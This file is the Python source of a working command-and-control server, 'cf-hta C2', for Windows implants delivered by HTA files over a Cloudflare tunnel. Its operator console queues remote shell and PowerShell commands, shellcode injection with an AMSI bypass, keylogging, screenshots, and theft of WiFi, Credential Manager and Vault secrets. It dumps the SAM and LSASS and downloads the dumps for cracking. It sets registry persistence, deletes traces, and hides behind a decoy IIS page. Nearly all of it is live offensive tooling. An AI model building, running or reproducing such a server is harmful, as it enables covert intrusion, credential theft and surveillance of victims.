#!/usr/bin/env python3
"""
cf-hta C2 Server — Cloudflared HTTPS beacon, HTA initial access
Usage: python3 server.py [--port 8080] [--key HEXKEY]
"""
import os, sys, time, json, base64, secrets, threading, textwrap, subprocess, re
from datetime import datetime
from collections import defaultdict
from flask import Flask, request, jsonify, abort

# ── Config ────────────────────────────────────────────────────────────────────
PORT     = int(os.environ.get("PORT", 8080))
XOR_KEY  = bytes.fromhex(os.environ.get("C2_KEY", secrets.token_hex(16)))
SCREENS  = os.path.join(os.path.dirname(__file__), "screens")
os.makedirs(SCREENS, exist_ok=True)

app = Flask(__name__)
import logging; logging.getLogger("werkzeug").setLevel(logging.INFO)

# ── State ─────────────────────────────────────────────────────────────────────
agents       = {}                    # aid -> {h, u, os, p, adm, last, calls, first}
task_queue   = defaultdict(list)     # aid -> [task, ...]
result_store = defaultdict(list)     # aid -> [result, ...]
pending      = {}                    # task_id -> threading.Event + slot for result
state_lock   = threading.Lock()
_task_id     = 0

def new_tid():
    global _task_id
    _task_id += 1
    return f"t{_task_id:04d}"

# ── Crypto ────────────────────────────────────────────────────────────────────
def xor(data: bytes) -> bytes:
    return bytes(b ^ XOR_KEY[i % len(XOR_KEY)] for i, b in enumerate(data))

def enc(s: str) -> str:
    return base64.b64encode(xor(s.encode())).decode()

def dec(s: str) -> str:
    return xor(base64.b64decode(s + "==")).decode(errors="replace")

# ── Routes ────────────────────────────────────────────────────────────────────
@app.route("/ci", methods=["POST"])
def check_in():
    try:
        data = request.get_json(force=True)
        aid  = data.get("id", "?")[:16]
        with state_lock:
            if aid not in agents:
                agents[aid] = {**data,
                    "first": datetime.now().strftime("%H:%M:%S"),
                    "calls": 0}
                _bell(f"\n[+] NEW AGENT  \033[32m{data.get('h','?')}\033[0m"
                      f"\\{data.get('u','?')}  [{aid[:8]}]"
                      f"  OS={data.get('os','?')}  adm={data.get('adm',False)}\n")
            agents[aid]["last"]  = time.time()
            agents[aid]["calls"] += 1
            nxt = task_queue[aid].pop(0) if task_queue[aid] else None
        return json.dumps({"t": nxt})
    except Exception:
        abort(404)

@app.route("/r", methods=["POST"])
def result():
    try:
        data = request.get_json(force=True)
        aid  = data.get("id", "?")[:16]
        tid  = data.get("tid", "?")
        raw  = data.get("o", "")
        out  = dec(raw) if raw else "(empty)"

        with state_lock:
            result_store[aid].append({"tid": tid, "out": out, "ts": time.time()})
            if tid in pending:
                pending[tid]["out"] = out
                pending[tid]["ev"].set()

        # screenshot: raw is PNG base64 → save to disk
        if data.get("sc"):
            ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
            fn  = os.path.join(SCREENS, f"{aid[:8]}_{ts}.png")
            with open(fn, "wb") as f:
                f.write(base64.b64decode(out.strip()))
            _bell(f"\n[{aid[:8]}] \033[35mScreenshot saved → {fn}\033[0m\n")
        else:
            _bell(f"\n[{aid[:8]}]\n\033[36m{out.strip()}\033[0m\n")

        return "ok"
    except Exception as e:
        _bell(f"\n[/r ERR] {type(e).__name__}: {e}  body={request.data[:120]}\n")
        abort(404)

@app.route("/", methods=["GET"])
def decoy():
    return ("<html><head><title>IIS Windows Server</title></head><body>"
            "<h2>403 - Forbidden: Access is denied.</h2></body></html>"), 403

@app.route("/health")
def health():
    return "ok"

# ── Bell helper ───────────────────────────────────────────────────────────────
def _bell(msg):
    sys.stdout.write(f"\r\033[K{msg}c2> ")
    sys.stdout.flush()

# ── Operator CLI ──────────────────────────────────────────────────────────────
HELP = """
── Shell / Execution ─────────────────────────────────────────────────────────
  sh      <id> <cmd>            CMD shell (WMI parent=WmiPrvSE, no mshta→cmd)
  ps      <id> <code>           PowerShell via temp .ps1 (WMI, sin -EncodedCommand)
  inject  <id> <pid> <sc.bin>   Process inject shellcode (inline C#, AMSI bypass)

── Recon ──────────────────────────────────────────────────────────────────────
  recon   <id>                  Full recon dump (16 cmds: whoami, ipconfig, ARP, users, procs, disks, domain, routes, sysinfo, ...)
  sc      <id>                  Screenshot (PNG guardado en ./screens/)
  clip    <id>                  Clipboard contents
  env     <id>                  Environment variables (set)
  plist   <id>                  Process list (tasklist /fo csv)
  arp     <id>                  ARP table
  net     <id>                  ipconfig /all

── Credenciales (sin Mimikatz binario) ────────────────────────────────────────
  wifipass  <id>                WiFi saved passwords (netsh LOLBin)
  cmdkeys   <id>                Windows Credential Manager cached (cmdkey /list)
  vault     <id>                Windows Vault credentials (vaultcmd)
  hivesave  <id>                reg save SAM+SYSTEM+SECURITY → auto-dl + instrucciones
  lsadump   <id>                comsvcs.dll MiniDump → auto-dl → pypykatz

── Keylogger ──────────────────────────────────────────────────────────────────
  klog    <id> [secs=30]        Keylogger PS GetAsyncKeyState N segundos

── Archivos ───────────────────────────────────────────────────────────────────
  dl      <id> <remote_path>    Download file del victim
  ul      <id> <local> <remote> Upload file al victim

── Persistencia ───────────────────────────────────────────────────────────────
  persist <id> <name> <cmd>     HKCU\\Run registry
  spawn   <id>                  Copia HTA a AppData + HKCU Run (persistencia extra)

── Gestión ────────────────────────────────────────────────────────────────────
  agents                        Lista agentes activos
  use     <id>                  Set agente default (prefijo corto ok)
  kill    <id>                  Terminar agente
  results [id]                  Últimos 10 resultados almacenados
  key                           Print XOR key hex
  help / ?                      This message
"""

def resolve_agent(token: str) -> str | None:
    if token in agents:
        return token
    matches = [a for a in agents if a.startswith(token)]
    return matches[0] if len(matches) == 1 else None

_default_agent = None

def dispatch(aid: str, ty: str, cmd: str, wait=True, timeout=120) -> str:
    tid = new_tid()
    task = {"id": tid, "ty": ty, "c": enc(cmd)}
    ev = threading.Event()
    pending[tid] = {"ev": ev, "out": None}
    with state_lock:
        task_queue[aid].append(task)
    print(f"  \033[90m[→] {tid} queued for {aid[:8]}\033[0m")
    if not wait:
        return tid
    if ev.wait(timeout):
        out = pending.pop(tid)["out"]
    else:
        pending.pop(tid, None)
        out = f"(timeout after {timeout}s — agent may be sleeping)"
    return out

def cli():
    global _default_agent
    import readline as rl
    rl.set_history_length(500)

    while True:
        try:
            line = input("c2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[!] bye")
            os._exit(0)
        if not line:
            continue

        parts = line.split()
        cmd = parts[0].lower()

        if cmd in ("help", "?"):
            print(HELP)

        elif cmd == "key":
            print(f"  XOR key (hex): {XOR_KEY.hex()}")

        elif cmd == "agents":
            if not agents:
                print("  (no agents)")
            else:
                print(f"  {'ID':8}  {'HOST':20}  {'USER':25}  {'OS':20}  {'ADM':5}  {'CALLS':6}  LAST")
                print("  " + "-"*100)
                now = time.time()
                for aid, a in agents.items():
                    ago = int(now - a.get("last", now))
                    ago_str = f"{ago}s" if ago < 120 else f"{ago//60}m"
                    adm = "\033[31mYES\033[0m" if a.get("adm") else "no"
                    print(f"  {aid[:8]}  {a.get('h','?'):20}  {a.get('u','?'):25}  "
                          f"{str(a.get('os','?'))[:20]:20}  {adm:12}  {a.get('calls',0):6}  {ago_str}")

        elif cmd == "use":
            if len(parts) < 2:
                print("  usage: use <id>")
            else:
                aid = resolve_agent(parts[1])
                if aid:
                    _default_agent = aid
                    print(f"  [*] Default agent: {aid[:8]}")
                else:
                    print(f"  [!] Agent not found: {parts[1]}")

        elif cmd == "results":
            target = resolve_agent(parts[1]) if len(parts) > 1 else _default_agent
            if not target:
                print("  [!] No agent specified")
            else:
                for r in result_store.get(target, [])[-10:]:
                    ts = datetime.fromtimestamp(r["ts"]).strftime("%H:%M:%S")
                    print(f"  [{ts}] {r['tid']}\n\033[36m{r['out'].strip()}\033[0m\n")

        elif cmd in ("sh", "ps", "sc", "dl", "ul", "arp", "net", "kill", "inject", "persist",
                     "clip", "env", "plist", "wifipass", "cmdkeys", "vault",
                     "hivesave", "lsadump", "klog", "spawn", "recon"):
            # resolve agent: first arg if it looks like an agent id, else _default_agent
            aid = None
            rest_parts = parts[1:]
            if rest_parts and (resolve_agent(rest_parts[0]) or rest_parts[0] in agents):
                aid = resolve_agent(rest_parts[0])
                rest_parts = rest_parts[1:]
            if not aid:
                aid = _default_agent
            if not aid:
                print("  [!] No agent. Use: use <id>  or prefix command with agent ID")
                continue

            arg = " ".join(rest_parts) if rest_parts else ""

            if cmd == "sh":
                if not arg:
                    print("  usage: sh <id> <cmd>"); continue
                print(dispatch(aid, "sh", arg))

            elif cmd == "ps":
                if not arg:
                    print("  usage: ps <id> <ps_code>"); continue
                print(dispatch(aid, "ps", arg))

            elif cmd == "sc":
                tid = dispatch(aid, "sc", "", wait=False)
                print(f"  [*] Screenshot requested (tid={tid}) — waiting...")
                # actual result comes via /r with sc=True flag
                ev = pending.get(tid, {}).get("ev")
                if ev and ev.wait(30):
                    pass  # already printed by _bell
                else:
                    print("  (timeout)")

            elif cmd == "dl":
                if not arg:
                    print("  usage: dl <id> <remote_path>"); continue
                out = dispatch(aid, "dl", arg, timeout=120)
                try:
                    fn = os.path.basename(arg) + f".{int(time.time())}.bin"
                    with open(fn, "wb") as f:
                        f.write(base64.b64decode(out.strip()))
                    print(f"  [+] Saved to {fn}  ({os.path.getsize(fn)} bytes)")
                except Exception as e:
                    print(f"  [!] {e}\n{out[:200]}")

            elif cmd == "ul":
                if len(rest_parts) < 2:
                    print("  usage: ul <id> <local_path> <remote_path>"); continue
                local, remote = rest_parts[0], rest_parts[1]
                with open(local, "rb") as f:
                    b64 = base64.b64encode(f.read()).decode()
                print(dispatch(aid, "ul", f"{remote}|{b64}", timeout=120))

            elif cmd == "persist":
                if len(rest_parts) < 2:
                    print("  usage: persist <id> <regname> <cmd>"); continue
                name = rest_parts[0]
                pcmd = rest_parts[1] if len(rest_parts) > 1 else ""
                print(dispatch(aid, "persist", f"{name}|{pcmd}"))

            elif cmd in ("arp", "net"):
                print(dispatch(aid, cmd, ""))

            # ── New commands ──────────────────────────────────────────────────
            elif cmd in ("clip", "env", "plist", "wifipass", "cmdkeys", "vault", "spawn"):
                print(dispatch(aid, cmd, "", timeout=60))

            elif cmd == "recon":
                print(f"  [*] Full recon requested — aguardando (~2-3 min)...")
                print(dispatch(aid, "recon", "", timeout=300))

            elif cmd == "klog":
                secs = rest_parts[0] if rest_parts else "30"
                print(f"  [*] Keylog for {secs}s — waiting...")
                print(dispatch(aid, "klog", secs, timeout=int(secs)+30))

            elif cmd == "hivesave":
                print("  [*] Dumping SAM+SYSTEM+SECURITY hives...")
                out = dispatch(aid, "hivesave", "", timeout=60)
                print(f"  {out}")
                # auto-dl each hive
                paths = [l.split(":",1)[1].strip() for l in out.splitlines() if ":" in l and l.split(":")[0] in ("SAM","SYSTEM","SECURITY")]
                for rpath in paths:
                    label = os.path.basename(rpath)
                    fn = f"{label}_{aid[:8]}_{int(time.time())}.sav"
                    raw = dispatch(aid, "dl", rpath, timeout=120)
                    try:
                        with open(fn, "wb") as f: f.write(base64.b64decode(raw.strip()))
                        print(f"  [+] {label} → {fn}  ({os.path.getsize(fn)} bytes)")
                        dispatch(aid, "sh", f"del \"{rpath}\"", wait=False)
                    except Exception as e:
                        print(f"  [!] dl {label}: {e}")
                if paths:
                    sav = [f for f in os.listdir(".") if f.endswith(".sav") and aid[:8] in f]
                    if len(sav) >= 3:
                        sam  = next((f for f in sav if "a.sav" in f), "sam.sav")
                        sys_ = next((f for f in sav if "b.sav" in f), "system.sav")
                        sec  = next((f for f in sav if "c.sav" in f), "security.sav")
                        print(f"\n  → impacket-secretsdump -sam {sam} -system {sys_} -security {sec} LOCAL\n")

            elif cmd == "lsadump":
                print("  [*] Requesting LSASS dump via comsvcs.dll...")
                out = dispatch(aid, "lsadump", "", timeout=20)
                print(f"  {out}")
                if out.startswith("DUMP:"):
                    dumppath = out[5:].strip()
                    print(f"  [*] Auto-downloading {dumppath} ...")
                    raw = dispatch(aid, "dl", dumppath, timeout=120)
                    try:
                        fn = f"lsass_{aid[:8]}_{int(time.time())}.dmp"
                        with open(fn, "wb") as f: f.write(base64.b64decode(raw.strip()))
                        print(f"  [+] Saved → {fn}  ({os.path.getsize(fn)} bytes)")
                        print(f"  → pypykatz lsa minidump {fn}")
                        dispatch(aid, "sh", f"del \"{dumppath}\"", wait=False)
                    except Exception as e:
                        print(f"  [!] {e}")

            elif cmd == "kill":
                print(dispatch(aid, "die", "", wait=False))
                print(f"  [*] Kill sent to {aid[:8]}")
                with state_lock:
                    agents.pop(aid, None)

            elif cmd == "inject":
                if len(rest_parts) < 2:
                    print("  usage: inject <id> <pid> <shellcode.bin>"); continue
                pid, sc_file = rest_parts[0], rest_parts[1]
                with open(sc_file, "rb") as f:
                    sc_b64 = base64.b64encode(f.read()).decode()
                print(dispatch(aid, "inject", f"{pid}|{sc_b64}", timeout=30))

        else:
            print(f"  [!] Unknown command: {cmd}  (type help)")

# ── Entry point ───────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=PORT)
    ap.add_argument("--key",  default=XOR_KEY.hex())
    args = ap.parse_args()

    PORT    = args.port
    XOR_KEY = bytes.fromhex(args.key)

    print(f"\033[1;32m[*] cf-hta C2\033[0m  port={PORT}  key={XOR_KEY.hex()}")
    print(f"[*] Generate payload:  python3 gen.py <TUNNEL_URL>")
    print(f"[*] Start tunnel:      cloudflared tunnel --url http://localhost:{PORT}\n")

    t = threading.Thread(target=lambda: app.run(host="0.0.0.0", port=PORT,
                                                  use_reloader=False, threaded=True),
                         daemon=True)
    t.start()
    time.sleep(0.5)
    cli()
